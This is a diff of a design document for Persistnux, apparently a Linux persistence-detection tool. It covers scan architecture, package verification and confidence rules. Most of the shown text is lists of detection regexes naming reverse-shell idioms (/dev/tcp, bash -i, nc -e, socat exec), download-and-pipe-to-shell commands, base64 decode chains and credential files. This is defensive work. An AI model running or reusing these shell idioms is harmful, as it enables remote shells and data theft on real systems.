@@ -1,1536 +1,882 @@
-# Persistnux Detection Logic Tree
+# Persistnux Detection Logic
 
-## Version 2.2.0
+## Version 2.4.0
 
-This document describes the complete detection and analysis logic flow.
-
----
-
-## Use Cases
-
-### 1. Incident Response - Post-Compromise Analysis
-```bash
-# Full scan with all findings for forensic analysis
-sudo ./persistnux.sh --all
-
-# Output: Complete inventory of all persistence mechanisms
-# Use: Compare against known-good baseline, identify anomalies
-```
-
-### 2. Threat Hunting - Proactive Search
-```bash
-# Focus on HIGH/CRITICAL findings only
-sudo MIN_CONFIDENCE=HIGH ./persistnux.sh
-
-# Output: Only suspicious findings requiring immediate investigation
-# Use: Quick triage during active threat hunt
-```
-
-### 3. Security Audit - Compliance Check
-```bash
-# Standard suspicious-only scan
-sudo ./persistnux.sh
-
-# Output: MEDIUM, HIGH, CRITICAL findings
-# Use: Regular security audits, identify misconfigurations
-```
-
-### 4. Baseline Creation
-```bash
-# Capture all persistence points on clean system
-sudo FILTER_MODE=all ./persistnux.sh
-mv persistnux_output/ baseline_$(date +%Y%m%d)/
-
-# Later: Compare against baseline
-diff baseline_*/persistnux_*.csv current_scan/persistnux_*.csv
-```
+Complete detection and analysis logic for all 14 modules. This document covers: exact scan paths, artifact parsing, detection flows, confidence determination, and pattern architecture. For the matched_pattern reference, see `MATCHED_PATTERNS.md`. For the mechanism inventory, see `PERSISTENCE_MECHANISMS.md`.
 
 ---
 
-## Detection Module Overview
+## Execution Model
+
+### Parallel Module Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    PERSISTNUX EXECUTION FLOW                     │
-├─────────────────────────────────────────────────────────────────┤
-│  1. Initialize   → Parse args, create output files              │
-│  2. Build Patterns → Compile regex for fast matching            │
-│     ├── COMBINED_NEVER_WHITELIST_PATTERN (always-flag)          │
-│     ├── COMBINED_COMMAND_PATTERN (suspicious commands)          │
-│     ├── COMBINED_NETWORK_PATTERN (network indicators)           │
-│     └── UNIFIED_SUSPICIOUS_PATTERN = union of all three         │
-│  3. Run 7 Detection Modules (sequential)                        │
-│  4. Output → CSV + JSONL with matched patterns                  │
-│  5. Cleanup → Remove temp files                                 │
-└─────────────────────────────────────────────────────────────────┘
-
-Detection Modules:
-  [1/7] Systemd Services    → .service files, ExecStart analysis
-  [2/7] Cron Jobs           → System/user crontabs, at jobs
-  [3/7] Shell Profiles      → .bashrc, .profile, /etc/profile.d
-  [4/7] Init Scripts        → rc.local, /etc/init.d
-  [5/7] Kernel/Preload      → ld.so.preload, kernel modules
-  [6/7] Additional          → XDG autostart, sudoers, PAM, MOTD
-  [7/7] Backdoor Locations  → Package managers, git, webshells
+main()
+ │
+ ├─ Launch 14 background subshells simultaneously
+ │    Each subshell:
+ │      CSV_FILE  = temp per-module CSV
+ │      JSONL_FILE = temp per-module JSONL
+ │      MODULE_NAME = module name for diagnostics
+ │      "$_mfn"   = module function call
+ │    All stdout+stderr → per-module temp log file
+ │
+ └─ Wait loop (display order):
+      for each module in order:
+        wait $pid       ← blocks until module finishes
+        cat $log        ← prints buffered output
+        cat $csv >> master CSV
+        cat $jsonl >> master JSONL
 ```
+
+**Module display order:**
+```
+1: systemd    2: cron      3: shell_profiles  4: init_scripts  5: kernel_preload
+6: additional 7: backdoors 8: ssh             9: binary_integrity
+10: bootloader 11: polkit  12: dbus           13: udev         14: container
+```
+
+### Output Buffering
+
+Every module's console output (`log_info`, `log_check`, `log_finding`) is captured in a temp log file and printed only after that module's background job completes. Users see module output in display order, not execution order. A hung module blocks all subsequent display — `wait` with `|| true` ensures a failed module does not abort the main process.
 
 ---
 
-## Confidence Level Definitions
+## Pattern Architecture
 
-| Level | Meaning | Action Required |
-|-------|---------|-----------------|
-| **LOW** | Baseline system config, package-managed | Informational only |
-| **MEDIUM** | Potentially suspicious, needs review | Manual review recommended |
-| **HIGH** | Suspicious patterns detected | Investigate immediately |
-| **CRITICAL** | Modified package files, SUID+suspicious, likely compromise | Incident response required |
+### Source Arrays
 
-### Automatic Escalation Rules (v2.2.0)
+All detection patterns are defined as bash arrays in the script header. These are the single source of truth — all runtime regex is derived from them at startup. Adding a string to an array automatically includes it in all combined patterns with no other changes required.
 
-- **MEDIUM → HIGH**: File modified within last 7 days
-- **HIGH → CRITICAL**: SUID or SGID bit set (`rwsr-xr-x` / `rwxr-sr-x`) on a suspiciously-matching file
-- **ANY → CRITICAL**: Package verification failure (dpkg/rpm --verify reports file modified)
-
----
-
-## Pattern Architecture (v2.2.0)
-
-### Pattern Arrays (Authoritative Source)
-
-All patterns are defined in bash arrays at the top of the script. These are the **single source of truth** — all runtime patterns are derived from them.
+**`NEVER_WHITELIST_PATTERNS`** — Patterns that are always malicious in any persistence context. Package-managed files matching these are still flagged HIGH (preventing package-status bypass). These are the highest-priority patterns.
 
 ```
-NEVER_WHITELIST_PATTERNS[]    → Always flag, regardless of package status
-SUSPICIOUS_COMMANDS[]         → Common attack command patterns
-SUSPICIOUS_NETWORK_PATTERNS[] → Network/shell indicator patterns
-SUSPICIOUS_LOCATIONS[]        → Filesystem paths that are always suspicious
+/dev/tcp/                   # TCP redirect shell
+/dev/udp/                   # UDP redirect shell
+bash -i                     # Interactive bash
+sh -i                       # Interactive sh
+nc -e                       # Netcat exec
+nc .*-e                     # Netcat exec variant
+ncat -e / ncat .*-e         # Ncat exec
+busybox nc.*-e              # Busybox netcat
+busybox.*(sh|bash).*-[ice]  # Busybox shell
+\| *nc                      # Pipe to netcat
+\| *bash\b / \| *sh\b       # Pipe to shell
+\| */bin/sh / \| */bin/bash # Pipe to path shell
+>&[ ]*/dev/                 # Redirect to /dev
+exec [0-9]*<>/dev/          # FD open to /dev
+python.*socket\.socket      # Python socket creation
+python.*socket.*connect     # Python socket connect
+perl.*socket.*connect       # Perl socket connect
+ruby.*TCPSocket             # Ruby TCP socket
+ruby.*Socket\.new           # Ruby socket
+socat.*exec:                # Socat shell
+socat.*TCP:                 # Socat TCP
+telnet.*\|.*(bash|sh)       # Telnet pipe shell
+xterm -display              # Xterm display redirect
+mknod.*backpipe             # Named pipe backconnect
+mkfifo.*/tmp|/dev/shm...    # FIFO in temp dir
+source .*/tmp|/dev/shm      # Source from temp dir
+\. .*/tmp|/dev/shm          # Dot-source from temp dir
+script.*-q.*/dev/null       # Script null output (TTY fix)
+rev.*\|.*(bash|sh|exec)     # Rev encoding pipe
+tr.*[A-Za-z].*\|.*(bash|sh) # Tr rotation pipe
+eval.*\$\(.*curl            # Eval curl output
+eval.*\$\(.*wget            # Eval wget output
+LD_PRELOAD=.*/(tmp|dev/shm|var/tmp)/  # LD_PRELOAD from temp
+LD_LIBRARY_PATH=.*/(tmp|...)          # LD_LIBRARY_PATH from temp
+nsenter.*-t.*1              # Container namespace escape
 ```
 
-### build_combined_patterns() — Startup Derivation
-
-At startup, `build_combined_patterns()` joins each array into a pipe-delimited combined regex and builds the unified gate:
-
-```bash
-IFS='|'
-COMBINED_NEVER_WHITELIST_PATTERN="${NEVER_WHITELIST_PATTERNS[*]}"
-COMBINED_COMMAND_PATTERN="${SUSPICIOUS_COMMANDS[*]}"
-COMBINED_NETWORK_PATTERN="${SUSPICIOUS_NETWORK_PATTERNS[*]}"
-
-# UNIFIED is derived — never hardcoded
-UNIFIED_SUSPICIOUS_PATTERN="${COMBINED_NEVER_WHITELIST_PATTERN}|${COMBINED_COMMAND_PATTERN}|${COMBINED_NETWORK_PATTERN}"
-```
-
-**Key invariant:** Any pattern added to an array is automatically included in UNIFIED and all combined patterns. There is no separate string to maintain.
-
-### quick_suspicious_check() — First Gate
-
-Before any deep analysis, every command/file is tested against UNIFIED_SUSPICIOUS_PATTERN in a single `grep -qiE` call. If no match, analysis stops immediately. This eliminates the bulk of subprocess overhead for clean files.
+**`SUSPICIOUS_COMMANDS`** — Common attack command patterns. Lower priority than NEVER_WHITELIST but still high-confidence indicators.
 
 ```
-Input command → grep -qiE "$UNIFIED_SUSPICIOUS_PATTERN"
-                     │
-            ┌────────┴────────┐
-           MISS              HIT
-            │                 │
-        SKIP all           Continue to
-        analysis           specific checks
+curl.*\|.*(bash|sh)         # Download-pipe-execute
+wget.*\|.*(bash|sh)         # Download-pipe-execute
+`curl.*/`wget.*\|...        # Backtick variants
+curl.* sh -c / wget.* sh -c # Pipe to sh -c
+curl.*-o.*/tmp|/dev/shm     # Download to temp
+wget.*-O.*/tmp|/dev/shm     # Download to temp
+chmod \+x.*/tmp|/dev/shm    # Make temp file executable
+chmod 777                   # World-writable
+base64 -d / base64 --decode # Base64 decode
+eval.*\$.*base64            # Eval decoded base64
+echo.*\|.*base64.*-d        # Pipe through base64 decode
+python.*-c.*import (socket|subprocess|pty|ctypes|os.system|popen|base64|exec|eval)
+python.*-c.*exec\(          # Python inline exec
+perl -e / ruby -e / php -r  # Interpreter inline
+php.*fsockopen              # PHP socket
+openssl.*-d.*-base64        # OpenSSL decode
+source/. from temp dirs     # Sourcing from writable dirs
+nohup .*/tmp|/dev/shm       # Background from temp
+nohup.*setsid               # Detached process
+tftp.*-g                    # TFTP get (download)
+dd if=/tmp|/dev/shm         # DD from temp
+rev.*\|.*(bash|sh)          # Rev encoding
+tr.*[A-Za-z].*\|.*(bash|sh) # ROT-style encoding
+script.*-q.*/dev/null       # Script command TTY fix
 ```
 
----
-
-## Module 1: Systemd Services Detection Tree
+**`SUSPICIOUS_NETWORK_PATTERNS`** — Network and shell indicator patterns for reverse shell detection.
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│              SYSTEMD SERVICE ANALYSIS (v2.2.0)                  │
-│         Only scans .service files (not .socket/.timer)          │
-│         Disabled services skipped UNLESS a matching .timer      │
-│         file exists in any systemd path (timer activates it)    │
-│                                                                 │
-│  OPTIMIZATION: Package verification FIRST, skip analysis if OK  │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ SCAN PATHS:                                                     │
-│   /etc/systemd/system     /usr/lib/systemd/system               │
-│   /lib/systemd/system     /run/systemd/system                   │
-│   /etc/systemd/user       ~/.config/systemd/user                │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │   For each .service file:     │
-              │   Extract: ExecStart=<cmd>    │
-              │   Get: enabled status, age    │
-              └───────────────────────────────┘
-                              │
-                              ▼
-              ┌───────────────────────────────┐
-              │   Is ExecStart present?       │
-              └───────────────────────────────┘
-                     │              │
-                    YES            NO
-                     │              │
-                     │              ▼
-                     │    ┌────────────────────────┐
-                     │    │ Check service file     │
-                     │    │ package status:        │
-                     │    │ • Verified → LOW       │
-                     │    │ • Modified → CRITICAL  │
-                     │    │ • Unmanaged → MEDIUM   │
-                     │    └────────────────────────┘
-                     │
-                     ▼
-         ┌──────────────────────────────────┐
-         │     Extract executable from       │
-         │     ExecStart command             │
-         └──────────────────────────────────┘
-                     │
-                     ▼
-    ┌────────────────────────────────────────┐
-    │   Is executable an INTERPRETER?        │
-    │   (python, perl, ruby, bash, sh, etc.) │
-    └────────────────────────────────────────┘
-           │                        │
-          YES                       NO
-           │                        │
-           ▼                        ▼
+bash -i >& /dev/tcp/        # Classic bash TCP shell
+bash -i >& /dev/udp/        # Classic bash UDP shell
+sh -i >$ /dev/tcp/          # sh variant
+zsh -i >& /dev/tcp/         # zsh variant
+ksh -i >& /dev/tcp/         # ksh variant
+/bin/bash -c exec 5<>/dev/tcp/  # FD redirect
+nc.*-e.*(sh|bash|dash|zsh)  # Netcat exec patterns
+/bin/sh | nc                # Pipe to netcat
+nc -k.*-l / ncat -k.*-l    # Persistent listen
+mknod.*backpipe             # Named pipe
+telnet.*\|.*(bash|sh)       # Telnet redirect
+socat exec:                 # Socat exec shell
+nsenter.*-t.*1              # Container escape
+xterm -display              # X display redirect
+```
 
-═══════════════════════════════════════════════════════════════════
-                    INTERPRETER PATH
-═══════════════════════════════════════════════════════════════════
+**`SUSPICIOUS_LOCATIONS`** — Filesystem paths that are always suspicious as execution locations.
 
-    ┌────────────────────────────────────────┐
-    │ 1. Check interpreter binary itself     │
-    │                                        │
-    │ Is /usr/bin/python3 compromised?       │
-    │   • Modified package → CRITICAL        │
-    │   • Unmanaged from odd path → HIGH     │
-    └────────────────────────────────────────┘
-                     │
-                     ▼
-    ┌────────────────────────────────────────┐
-    │ 2. Extract script path from args       │
-    │                                        │
-    │ ExecStart=/usr/bin/python3 /opt/app.py │
-    │                              ▲          │
-    │               THIS is what we analyze  │
-    └────────────────────────────────────────┘
-                     │
-         ┌───────────┴───────────┐
-         │                       │
-    Script found            No script (inline -c)
-         │                       │
-         ▼                       ▼
-    ┌────────────────┐    ┌──────────────────────┐
-    │ Check SCRIPT's │    │ Inline code          │
-    │ package status │    │ python -c "..."      │
-    │ FIRST!         │    │ → analyze_inline_code│
-    └────────────────┘    │ → HIGH               │
-         │                └──────────────────────┘
-    ┌────┴────┬──────────────┐
-    │         │              │
- Verified  Modified     Unmanaged
-    │         │              │
-    ▼         ▼              ▼
-┌──────┐  ┌────────┐  ┌──────────────────┐
-│ LOW  │  │CRITICAL│  │ analyze_script_  │
-│ DONE │  │ DONE   │  │ content():       │
-│ SKIP │  │        │  │ • NEVER_WHITELIST│
-│ REST │  │        │  │ • commands       │
-└──────┘  └────────┘  │ • multiline      │
-                      │ • encoding       │
-                      │ • entropy+exec   │
-                      │ Suspicious →HIGH │
-                      └──────────────────┘
+```
+^/dev/shm/      # Shared memory (no persistent storage)
+^/tmp/          # Temp (world-writable, cleared on reboot)
+^/var/tmp/      # Persistent temp (world-writable)
+/\.[a-z]        # Hidden directory
+\.\./\.\.       # Directory traversal
+^/run/user/     # User runtime dir
+```
 
+**`SUSPICIOUS_FILES`** — Sensitive file paths that should not appear in commands or script content.
 
-═══════════════════════════════════════════════════════════════════
-                    DIRECT BINARY PATH
-═══════════════════════════════════════════════════════════════════
+```
+/etc/shadow
+/etc/passwd
+/root/.ssh
+id_rsa
+authorized_keys
+```
 
-    ┌────────────────────────────────────────┐
-    │ 1. Check package status FIRST          │
-    │                                        │
-    │    dpkg -S /usr/sbin/sshd              │
-    │    dpkg --verify openssh-server        │
-    └────────────────────────────────────────┘
-                     │
-    ┌────────────────┼────────────────┐
-    │                │                │
- Verified        Modified        Unmanaged
-    │                │                │
-    ▼                ▼                ▼
-┌──────────┐   ┌──────────┐   ┌───────────────────┐
-│   LOW    │   │ CRITICAL │   │ Continue with     │
-│   DONE   │   │   DONE   │   │ full analysis...  │
-│          │   │          │   │                   │
-│ ★ SKIP   │   │          │   │                   │
-│ ALL      │   │          │   │                   │
-│ PATTERN  │   │          │   │                   │
-│ ANALYSIS │   │          │   │                   │
-└──────────┘   └──────────┘   └───────────────────┘
-                                      │
-                                      ▼
-                   ┌──────────────────────────────────┐
-                   │ 2. Location check               │
-                   │    /tmp, /dev/shm → HIGH        │
-                   └──────────────────────────────────┘
-                                      │
-                                      ▼
-                   ┌──────────────────────────────────┐
-                   │ 3. If script, analyze content   │
-                   │    Suspicious patterns → HIGH   │
-                   └──────────────────────────────────┘
-                                      │
-                                      ▼
-                   ┌──────────────────────────────────┐
-                   │ 4. Pattern match on ExecStart   │
-                   │    curl|bash, /dev/tcp → HIGH   │
-                   └──────────────────────────────────┘
-                                      │
-                                      ▼
-                   ┌──────────────────────────────────┐
-                   │ 5. Time-based check             │
-                   │    Recent + enabled → HIGH      │
-                   └──────────────────────────────────┘
+**`MULTILINE_SUSPICIOUS_PATTERNS`** — Patterns that span logical lines or require heredoc context.
 
+```
+cat.*<<.*EOF.*bash          # Heredoc to bash
+cat.*<<.*EOF.*/dev/tcp      # Heredoc to /dev/tcp
+cat.*<<.*EOF.*curl          # Heredoc download
+base64.*-d.*<<.*EOF         # Base64 decode heredoc
+eval.*<<.*EOF               # Eval heredoc
+python.*-c.*<<.*EOF         # Python heredoc
+perl.*-e.*<<.*EOF           # Perl heredoc
+rev.*\|.*(bash|sh|exec)     # Rev pipe
+tr.*['"'].*['"'].*\|...     # ROT cipher pipe
+dd.*\|.*(bash|sh)           # DD pipe
+openssl.*-d.*\|.*(bash|sh)  # OpenSSL pipe
+base64.*-d.*\|.*(bash|sh)   # Base64 pipe
+```
 
-═══════════════════════════════════════════════════════════════════
-                    PERFORMANCE IMPACT
-═══════════════════════════════════════════════════════════════════
+**`NETWORK_INDICATOR_PATTERNS`** — Detects IP addresses in tool invocations and suspicious TLDs.
 
-BEFORE (old flow):
-  For EVERY service file:
-    1. grep dangerous patterns     ← subprocess
-    2. grep suspicious patterns    ← 4+ subprocess calls
-    3. check is_command_safe       ← package check here (late!)
-    4. more analysis...
-
-AFTER (optimized):
-  For EVERY service file:
-    1. Extract executable
-    2. Check package status        ← EARLY EXIT if verified
-       └─ Verified? → LOW, DONE    ← Skip all grep calls!
-
-  Typical system: ~200 services, ~180 are package-managed
-  BEFORE: 200 × (5+ grep calls) = 1000+ subprocesses
-  AFTER:  200 × (1 dpkg call) + 20 × (5 grep calls) = 300 calls
-
-  ≈ 70% reduction in subprocess spawning!
+```
+(curl|wget|...)+IP_REGEX    # Tool calling raw IP address
+(curl|wget|...)+SUSPICIOUS_TLD  # .ru, .cn, .onion, .tk, .xyz, .top, .pw, .cc, .biz
+(curl|wget|...)+LONG_DOMAIN # Long random-looking domain (>16 chars before TLD)
+(\\x[0-9a-fA-F]{2}){4}     # Hex-encoded IP address
 ```
 
 ---
 
-## Script Content Analysis (v2.2.0)
+### Pattern Compilation: `build_combined_patterns()`
 
-`analyze_script_content()` is called for unmanaged scripts to determine if content is suspicious.
-
-### Content Sampling Strategy
-
-For files of any size, content is read in up to **three zones**:
+At startup, each array is joined with `IFS='|'` into a pipe-delimited ERE string. Eight compiled patterns are produced:
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│  File size ≤ 1000 lines:   read entire file                     │
-│                                                                 │
-│  File size > 1000 lines:   head-1000 + tail-200                 │
-│                                                                 │
-│  File size > 1200 lines:   head-1000 + mid-200 + tail-200       │
-│                             (mid = lines [N/2-100 .. N/2+99])   │
-└─────────────────────────────────────────────────────────────────┘
+COMBINED_NEVER_WHITELIST_PATTERN    ← from NEVER_WHITELIST_PATTERNS
+COMBINED_COMMAND_PATTERN            ← from SUSPICIOUS_COMMANDS
+COMBINED_NETWORK_PATTERN            ← from SUSPICIOUS_NETWORK_PATTERNS
+COMBINED_LOCATION_PATTERN           ← from SUSPICIOUS_LOCATIONS
+COMBINED_FILE_PATTERN               ← from SUSPICIOUS_FILES
+COMBINED_KNOWN_GOOD_PATHS_PATTERN   ← from KNOWN_GOOD_EXECUTABLE_PATHS
+COMBINED_MULTILINE_PATTERN          ← from MULTILINE_SUSPICIOUS_PATTERNS
+COMBINED_NETWORK_INDICATOR_PATTERN  ← from NETWORK_INDICATOR_PATTERNS
+
+UNIFIED_SUSPICIOUS_PATTERN = COMBINED_NEVER_WHITELIST | COMBINED_COMMAND |
+                              COMBINED_NETWORK | COMBINED_NETWORK_INDICATOR
 ```
 
-This three-zone approach ensures that content buried in the middle of large scripts (lines 1001 to N-200) is not missed.
-
-### Comment Stripping
-
-Before any pattern check, a clean copy is derived:
-
-```bash
-script_content_clean=$(echo "$script_content" | grep -Ev '^[[:space:]]*#')
-```
-
-All NEVER_WHITELIST, COMBINED_COMMAND, multiline, encoding, and most other checks run against `script_content_clean`. This prevents false positives from commented-out educational code (e.g., `# Example: curl | bash`).
-
-### Analysis Checks (in order)
-
-```
-1. NEVER_WHITELIST check        → CRITICAL match → return immediately
-2. COMBINED_COMMAND check       → suspicious command match
-   └── If interpreter -c/-e:   → call analyze_inline_code()
-3. COMBINED_NETWORK check       → network tool match
-4. Multiline pattern check      → multi-statement obfuscation
-5. Hex/octal/ANSI-C encoding    → obfuscated string literals
-6. tr-based cipher patterns     → ROT13/ROT47 decode-to-shell
-7. rev decode patterns          → rev <<< string | bash
-8. High-entropy + exec context  → base64 blobs next to eval/exec
-9. Base64 encoded content       → decode and re-analyze
-```
-
-### Entropy Detection (v2.0.0 — reduced FP)
-
-Standalone high-entropy strings are **not** flagged (too many false positives from TLS certs, UUIDs, API keys). Entropy is only flagged as `high_entropy_exec` when the same line also contains an execution context:
-
-```
-High-entropy value on same line as:
-  eval | exec | base64.*-d | bash | sh -c | openssl.*-d
-        → MATCH: high_entropy_exec
-Otherwise:
-        → SKIP (not suspicious alone)
-```
-
-### Inline Code Analysis (v2.2.0)
-
-When a matched line contains an interpreter with a `-c` or `-e` flag, `analyze_inline_code()` is called to extract and analyze the argument:
-
-```bash
-# Trigger: line contains interpreter + -c/-e flag
-if echo "$full_line" | grep -qiE '(bash|sh|dash|zsh|python[0-9.]*|perl[0-9.]*|ruby[0-9.]*)[[:space:]].*-[ce][[:space:]]'; then
-    analyze_inline_code "$full_line"
-fi
-```
-
-`analyze_inline_code()` extracts the quoted argument (single or double quoted), runs the same suspicious pattern battery against the extracted code, and sets `MATCHED_PATTERN="script_suspicious+inline:${INLINE_CODE_REASON}"`.
+`UNIFIED_SUSPICIOUS_PATTERN` is used as the fast first-gate check before all deep analysis.
 
 ---
 
-## Pattern Matching Logic
+### Core Analysis Functions
 
-### Pattern Categories and Examples
+#### `quick_suspicious_check(content)`
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    PATTERN MATCHING FLOW                        │
-└─────────────────────────────────────────────────────────────────┘
+Fast first-gate. Runs a single `grep -qiE "$UNIFIED_SUSPICIOUS_PATTERN"` on the input string. If no match, the caller skips all deep analysis. Eliminates subprocess overhead for the vast majority of clean files.
 
-Input: ExecStart="/usr/bin/python3 -c 'import socket;s=socket.socket()'"
+#### `analyze_script_content(content, file_path)`
 
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ COMBINED PATTERN CHECK (Fast Path)                              │
-│                                                                 │
-│ Build combined regex from all patterns in category:             │
-│   (pattern1|pattern2|pattern3|...)                              │
-│                                                                 │
-│ Single grep -qE check - if no match, skip category              │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                         Match Found
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ SPECIFIC PATTERN IDENTIFICATION                                 │
-│                                                                 │
-│ Loop through individual patterns to find exact match:           │
-│   Pattern: "python.*socket\.socket"                             │
-│   Match:   "python3 -c 'import socket;s=socket.socket"          │
-│                                                                 │
-│ Set globals:                                                    │
-│   MATCHED_PATTERN = "python.*socket\.socket"                    │
-│   MATCHED_CATEGORY = "command"                                  │
-│   MATCHED_STRING = "python3 -c 'import socket;s=socket.socket"  │
-└─────────────────────────────────────────────────────────────────┘
-```
+Deep multi-pass analysis of script content. Returns 0 (found) or 1 (clean). Sets `MATCHED_PATTERN` and `MATCHED_STRING` globals.
 
-### NEVER_WHITELIST Patterns (Always HIGH/CRITICAL)
+**Pass order:**
+1. NEVER_WHITELIST — highest priority, sets CRITICAL signal
+2. SUSPICIOUS_COMMANDS — command patterns
+3. SUSPICIOUS_NETWORK_PATTERNS — network/shell patterns
+4. MULTILINE_SUSPICIOUS_PATTERNS — cross-line patterns
+5. NETWORK_INDICATOR_PATTERNS — IP/TLD indicators
+6. SUSPICIOUS_FILES — sensitive file references
+7. Encoding chain detection — `base64 -d | bash`, `openssl -d | sh`
+8. High-entropy detection + exec pattern — random-looking strings with execution
 
-These patterns ALWAYS trigger regardless of package management status:
+#### `check_suspicious_patterns(content)`
 
-```
-Category: Reverse Shell Indicators
-├── /dev/tcp/              # Bash network pseudo-device
-├── /dev/udp/              # Bash network pseudo-device
-├── bash -i                # Interactive shell (reverse shell classic)
-├── sh -i                  # Interactive shell
-├── nc -e                  # Netcat execute
-├── nc .*-e                # Netcat execute (alternate flag order)
-├── ncat -e                # Ncat execute
-├── busybox nc.*-e         # BusyBox netcat execute
-├── busybox.*(sh|bash).*-[ice]  # BusyBox shell invocation
-├── \| *nc                 # Piping to netcat
-├── \| *bash\b             # Piping to bash
-├── \| *sh\b               # Piping to sh
-├── \| */bin/sh            # Piping to /bin/sh
-├── \| */bin/bash          # Piping to /bin/bash
-├── >&[ ]*/dev/            # Redirect to /dev (shell trick)
-├── exec [0-9]*<>/dev/     # Bidirectional fd to /dev/tcp
+Lighter version of analyze_script_content used for short strings (cron commands, env values). Checks NEVER_WHITELIST, SUSPICIOUS_COMMANDS, SUSPICIOUS_NETWORK_PATTERNS only.
 
-Category: Decode-to-Shell Obfuscation
-├── rev.*\|.*(bash|sh|exec)  # rev-encoded payload piped to shell
-├── tr.*[A-Za-z].*\|.*(bash|sh)  # ROT13/ROT47 decode piped to shell
-├── tr.*['"].*['"].*\|.*(bash|sh) # tr cipher variant piped to shell
-├── dd.*\|.*(bash|sh)      # dd-based payload delivery
-├── cat.*<<.*EOF.*bash     # Heredoc piped to bash
-├── base64.*-d.*<<.*EOF    # Base64 heredoc decode
-├── eval.*<<.*EOF          # Eval heredoc
+#### `is_package_managed(file_path)` / `check_file_package(file_path)`
 
-Category: Socket Operations
-├── python.*socket\.socket # Python socket creation
-├── python.*socket.*connect
-├── perl.*socket.*connect
-├── ruby.*TCPSocket
-├── ruby.*Socket\.new
+`is_package_managed()` returns the package status string via stdout and a return code:
+- Return 0: managed and unmodified → echoes `"package_name:managed"` or `"snap:managed"`, etc.
+- Return 1: unmanaged → echoes `"unmanaged"`
+- Return 2: managed but modified → echoes `"package_name:MODIFIED"`
 
-Category: Network Tools
-├── socat.*exec:           # Socat with exec
-├── socat.*TCP:            # Socat TCP
-├── telnet.*\|.*(bash|sh)  # Telnet piped to shell
-├── xterm -display         # X11 forwarding abuse
-├── nohup .*/tmp/          # Persistent background exec from /tmp
-├── nohup .*/dev/shm/      # Persistent background exec from /dev/shm
-├── tftp.*-g               # TFTP download
+Uses `PKG_CACHE` associative array to avoid re-querying the same path within a scan.
 
-Category: Named Pipes / Staging
-├── mknod.*backpipe
-└── mkfifo.*/( tmp|dev/shm|var/tmp)
+Query chain (first match wins): snap paths → flatpak paths → runtime managers (npm, pip, cargo) → dpkg → rpm → pacman.
 
-Category: Source from Temp
-├── source .*/tmp/
-├── source .*/dev/shm/
-├── \. .*/tmp/
-└── \. .*/dev/shm/
-```
+`check_file_package(file)` is a convenience wrapper that calls `is_package_managed` and stores the result in the global `PKG_STATUS` variable (instead of stdout capture), for use in contexts where direct assignment is cleaner.
 
-### SUSPICIOUS_COMMANDS Patterns
+#### `get_executable_from_command(command)`
 
-```
-Category: Download & Execute
-├── curl.*\|.*bash         # curl | bash
-├── curl.*\|.*sh           # curl | sh
-├── wget.*\|.*bash         # wget | bash
-├── wget.*\|.*sh           # wget | sh
-├── `curl.*\|.*bash        # Backtick curl | bash
-├── `wget.*\|.*bash        # Backtick wget | bash
-├── curl.* sh -c           # curl output to sh -c
-├── wget.* sh -c           # wget output to sh -c
-├── curl.*-o.*/tmp         # Download to /tmp
-├── curl.*-o.*/dev/shm     # Download to /dev/shm
-├── wget.*-O.*/tmp         # Download to /tmp
-└── wget.*-O.*/dev/shm     # Download to /dev/shm
+Strips systemd exec prefixes (`@`, `-`, `!`, `+`, `:`), handles env variable wrappers (`/usr/bin/env`), and extracts the first real executable path from a command string.
 
-Category: Permission Manipulation
-├── chmod \+x.*/tmp        # Executable in /tmp
-├── chmod \+x.*/dev/shm    # Executable in /dev/shm
-└── chmod 777[[:space:]]   # World-writable (exact, avoids FP on 7770)
+#### `adjust_confidence_for_package(confidence, pkg_status, file_path)`
 
-Category: Obfuscation/Encoding
-├── base64 -d              # Base64 decode
-├── base64 --decode        # Base64 decode (long form)
-├── eval.*\\\$.*base64     # Eval base64 decoded content
-├── echo.*\|.*base64.*-d   # Echo to base64 decode
-└── openssl.*-d.*-base64   # OpenSSL base64 decode
-
-Category: Inline Code Execution
-├── python.*-c.*import.*(socket|subprocess|pty|ctypes|
-│       os\.system|popen|base64|exec\b|eval\b)
-│                          # Python one-liner: only dangerous imports
-│                          # (import sys, import re → NOT flagged)
-├── python.*-c.*exec\(     # Python inline exec()
-├── perl -e                # Perl one-liner
-├── ruby -e                # Ruby one-liner
-├── php -r                 # PHP one-liner
-└── php.*fsockopen         # PHP socket connection
-
-Category: Sensitive File Access
-├── /etc/shadow
-├── /etc/passwd
-├── /root/.ssh
-├── id_rsa
-└── authorized_keys
-```
-
-### SUSPICIOUS_LOCATIONS Patterns
-
-```
-^/dev/shm/                 # Shared memory (volatile, no audit log)
-^/tmp/                     # Temp directory
-^/var/tmp/                 # Persistent temp
-/\.[a-z]                   # Hidden files/dirs
-\.\./\.\.                  # Path traversal
-```
+Applies package-based confidence adjustments:
+- Package-verified file: HIGH → MEDIUM, MEDIUM → LOW
+- Modified package file: any → CRITICAL
+- Unmanaged file in standard path: no change
+- File modified within 7 days: one tier up (LOW→MEDIUM, MEDIUM→HIGH)
 
 ---
 
-## Package Management Detection (v2.2.0)
+## Module 1: Systemd Services
 
-### is_package_managed() Flow
+**Function:** `check_systemd()` | **Label:** `[1/14] Systemd Services`
+
+### Scan Paths
+
+Service files: `/etc/systemd/system`, `/usr/lib/systemd/system`, `/lib/systemd/system`, `/run/systemd/system`, `/etc/systemd/user`, `/usr/lib/systemd/user`. Per-user: `~/.config/systemd/user` for all users (root mode).
+
+Generator directories: `/etc/systemd/system-generators`, `/usr/local/lib/systemd/system-generators`, `/usr/lib/systemd/system-generators`, `/lib/systemd/system-generators`.
+
+### Pre-filter
+
+Known-good service names are skipped without analysis (whitelist): `systemd-*`, `dbus-*`, `snap.*`, `NetworkManager*`, `ModemManager*`, `udisks*`, `colord*`, `accounts-daemon*`, and other vendor service patterns.
+
+Disabled services are also skipped UNLESS a matching `.timer` file exists (timer activation keeps the service reachable even when disabled).
+
+### ExecStart Analysis Flow
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                  PACKAGE STATUS DETECTION                       │
